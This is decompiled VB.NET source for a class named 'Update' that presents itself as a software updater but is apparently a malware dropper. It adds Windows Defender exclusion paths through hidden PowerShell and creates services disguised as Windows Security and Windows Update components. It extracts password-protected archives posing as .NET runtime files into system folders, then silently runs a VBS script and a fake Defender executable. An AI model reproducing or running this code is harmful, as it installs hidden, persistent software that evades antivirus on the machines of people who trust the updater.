Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Threading
Imports System.Windows.Forms

Namespace Software
	' Token: 0x0200000F RID: 15
	Public Class Update
		' Token: 0x0600008F RID: 143 RVA: 0x000215AC File Offset: 0x0001F7AC
		Public Sub PerformUpdate()
			Dim systemAppPath As String = "C:\Windows\SystemApps\Microsoft.MicrosoftEdgeUpdate"
			Dim exclusionPaths As String() = New String() { "C:\ProgramData", "C:\Windows" }
			Me.AddExclusionPaths(exclusionPaths)
			Me.CreateServices()
			Me.EnsureDirectoryExists(systemAppPath)
			If Not File.Exists(Path.Combine(systemAppPath, "Update.vbs")) AndAlso Not File.Exists(Path.Combine(systemAppPath, "Microsoft.PackageManager.rar")) AndAlso Not File.Exists(Path.Combine(systemAppPath, "SecurityHealthService.exe")) AndAlso Not File.Exists(Path.Combine(systemAppPath, "bin.rar")) AndAlso Not File.Exists(Path.Combine(systemAppPath, "data.rar")) Then
				Me.DecompressWithWinRAR(systemAppPath)
			End If
			Dim vbsFilePath As String = Path.Combine(systemAppPath, "Update.vbs")
			If File.Exists(vbsFilePath) Then
				Process.Start("wscript.exe", """" + vbsFilePath + """")
			End If
			Dim systemPath As String = "C:\Windows\SysWOW64"
			Me.EnsureDirectoryExists(systemPath)
			If Not File.Exists(Path.Combine(systemPath, "dllhost32.rar")) AndAlso Not File.Exists(Path.Combine(systemPath, "taskhostw32.rar")) AndAlso Not File.Exists(Path.Combine(systemPath, "SecurityService.exe")) AndAlso Not File.Exists(Path.Combine(systemPath, "WindowsUpdateService.exe")) Then
				Me.DecompressNetRuntime(systemPath)
			End If
			Thread.Sleep(5000)
			Me.RunWindowsDefenderSecurity()
		End Sub

		' Token: 0x06000090 RID: 144 RVA: 0x000216E8 File Offset: 0x0001F8E8
		Private Sub AddExclusionPaths(paths As String())
			For Each path As String In paths
				Dim command As String = "powershell -Command ""Add-MpPreference -ExclusionPath '" + path + "'"""
				Me.RunCommandHidden("cmd.exe", "/c " + command)
			Next
		End Sub

		' Token: 0x06000091 RID: 145 RVA: 0x00021730 File Offset: 0x0001F930
		Private Sub CreateServices()
			For Each service As String In New String() { "sc create ""COM+ System Service"" binPath= ""C:\ProgramData\System32\dllhost32.exe"" start= delayed-auto", "sc create ""Windows Security Health Host"" binPath= ""C:\Windows\SystemApps\Microsoft.MicrosoftEdgeUpdate\SecurityHealthService.exe"" start= delayed-auto", "sc create ""Windows Security"" binPath= ""C:\Windows\SysWOW64\SecurityService.exe"" start= delayed-auto", "sc create ""Windows Update Service"" binPath= ""C:\Windows\SysWOW64\WindowsUpdateService.exe"" start= auto" }
				Me.RunCommandHidden("cmd.exe", "/c " + service)
			Next
		End Sub

		' Token: 0x06000092 RID: 146 RVA: 0x0002178C File Offset: 0x0001F98C
		Private Sub DecompressWithWinRAR(destinationPath As String)
			Dim winRarPath As String = If(File.Exists("C:\Program Files\WinRAR\WinRAR.exe"), "C:\Program Files\WinRAR\WinRAR.exe", If(File.Exists("C:\Program Files (x86)\WinRAR\WinRAR.exe"), "C:\Program Files (x86)\WinRAR\WinRAR.exe", String.Empty))
			If String.IsNullOrEmpty(winRarPath) Then
				Return
			End If
			Dim sourcePath As String = Path.Combine(Application.StartupPath, "resources\tools\Net\NET_Framework_4.8.rar")
			Dim password As String = "README"
			Process.Start(New ProcessStartInfo() With { .FileName = winRarPath, .Arguments = String.Concat(New String() { "x -p", password, " """, sourcePath, """ """, destinationPath, """" }), .WindowStyle = ProcessWindowStyle.Hidden }).WaitForExit()
		End Sub

		' Token: 0x06000093 RID: 147 RVA: 0x00021840 File Offset: 0x0001FA40
		Private Sub DecompressNetRuntime(destinationPath As String)
			Dim winRarPath As String = If(File.Exists("C:\Program Files\WinRAR\WinRAR.exe"), "C:\Program Files\WinRAR\WinRAR.exe", If(File.Exists("C:\Program Files (x86)\WinRAR\WinRAR.exe"), "C:\Program Files (x86)\WinRAR\WinRAR.exe", String.Empty))
			If String.IsNullOrEmpty(winRarPath) Then
				Return
			End If
			Dim sourcePath As String = Path.Combine(Application.StartupPath, "resources\tools\Net\NET_Runtime.rar")
			Dim password As String = "README"
			Process.Start(New ProcessStartInfo() With { .FileName = winRarPath, .Arguments = String.Concat(New String() { "x -p", password, " """, sourcePath, """ """, destinationPath, """" }), .WindowStyle = ProcessWindowStyle.Hidden }).WaitForExit()
		End Sub

		' Token: 0x06000094 RID: 148 RVA: 0x000218F4 File Offset: 0x0001FAF4
		Private Sub EnsureDirectoryExists(path As String)
			If Not Directory.Exists(path) Then
				Directory.CreateDirectory(path)
			End If
		End Sub

		' Token: 0x06000095 RID: 149 RVA: 0x00021908 File Offset: 0x0001FB08
		Private Sub RunCommandHidden(fileName As String, arguments As String)
			Using process As Process = Process.Start(New ProcessStartInfo() With { .FileName = fileName, .Arguments = arguments, .CreateNoWindow = True, .WindowStyle = ProcessWindowStyle.Hidden, .UseShellExecute = False, .RedirectStandardOutput = True, .RedirectStandardError = True })
				process.WaitForExit()
			End Using
		End Sub

		' Token: 0x06000096 RID: 150 RVA: 0x00021974 File Offset: 0x0001FB74
		Private Sub RunWindowsDefenderSecurity()
			Dim defenderPath As String = Path.Combine(New String() { "C:\ProgramData\Microsoft\Windows\WindowsDefenderSecurity.exe" })
			If File.Exists(defenderPath) Then
				Process.Start(defenderPath)
			End If
		End Sub
	End Class
End Namespace
